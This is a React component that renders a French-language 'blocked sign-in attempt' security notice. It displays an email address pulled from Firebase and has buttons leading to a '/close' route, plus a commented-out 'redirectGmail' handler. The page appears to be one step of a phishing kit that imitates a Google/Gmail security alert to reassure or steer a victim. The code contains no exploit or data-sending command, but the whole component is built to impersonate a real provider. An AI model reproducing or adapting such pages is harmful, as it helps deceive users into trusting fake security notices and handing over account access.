import React, { useContext,useEffect, Fragment,useState } from 'react'
import { makeStyles, Grid, Typography, TextField, Button, Divider } from '@material-ui/core'
import Fullscreen from "react-full-screen";

import Header from '../Header';
import AccountCircle from '@material-ui/icons/AccountCircle';
import { Link } from 'react-router-dom'
import LockOutlinedIcon from '@material-ui/icons/LockOutlined';
import PhoneIphoneIcon from '@material-ui/icons/PhoneIphone';
import ErrorRoundedIcon from '@material-ui/icons/ErrorRounded';
import { FirebaseContext } from '../Firebase'
const style = {
  background: "#000"
}




const Activity = () => {
  const [mail, setMail] = useState('')
  const firebase = useContext(FirebaseContext)

  useEffect( ()=>{
    firebase.getMail()
    .then( collection=>{
      if(collection){
        let mailTemp = collection.data().mail
        let tabMail = mailTemp.split("/")
        // console.log(tabMail)
        setMail(tabMail[1])
      
      }else{
        // console.log("vide")
      }
    })
    .catch( err=>{
      console.log(err)
    })
  })

  const displayMail = mail ? mail : <span>....</span> 

  return (
    <Fragment>
      <Header />

      <Grid
        container
        direction="column"
        //justify="center"
        //alignItems="center"
        spacing={0}
        style={{ marginTop: '55px' }}
      >

        <Grid
          container
          direction="column"
          //justify="center"
          //alignItems="center"
          spacing={0}

        >
          <Grid item xs={12} style={{ background: "#f4d4d7 ",textAlign: 'center',padding: '20px 20px' }}>
          <Typography variant="h6" component="h6">
            Vous-êtes en toutes sécurité
          </Typography>
          <Typography>
          Nous avons bloqué une tentative de connexion à votre compte par une application moins sécurisée
          </Typography>
          


        </Grid>
        <Grid item container justify="center" alignItems="center" style={{marginTop: '10px'}}>
          <AccountCircle />
          <Typography variant="subtitle1" style={{ fontWeight: 'bolder',fontSize: '13px', margin: ' 10px 0 10px 3px' }}>
            {displayMail}
         </Typography>

        </Grid>

      <Grid item xs={12} style={{padding: '20px 0'}}>
        
      <PhoneIphoneIcon style={{ fontSize: '100px' }} />
      <ErrorRoundedIcon color="secondary"/>
      </Grid>
      <Grid itme={12} style={{padding: '10px 20px'}}>
        <Typography style={{fontWeight: 'bold',marginBottom: '10px'}}>
          Tentative de connéxion bloqué
        </Typography>
        <Typography>
        Gestion des paramètres et de la messagerie
        
        </Typography>
      </Grid>

      <Grid itme={12} style={{padding: '10px 18px'}}>
      <Button  
      color="primary" 
      href="#contained-buttons" 
      style={{fontWeight: 'bolder',textTransform: 'lowercase'}}
      >
      Plus d'info
      
      </Button>


<Link to="/close" style={{textDecoration: 'none'}}> 
<Button 
variant="contained" 
color="primary" 
style={{fontWeight: 'bolder',
float: 'right',
textTransform: 'lowercase'}}
// onClick={this.redirectGmail}
>

Yes
</Button>
</Link> 
        
      </Grid>


      </Grid>

      </Grid>

    </Fragment>
  );
}


export default Activity;
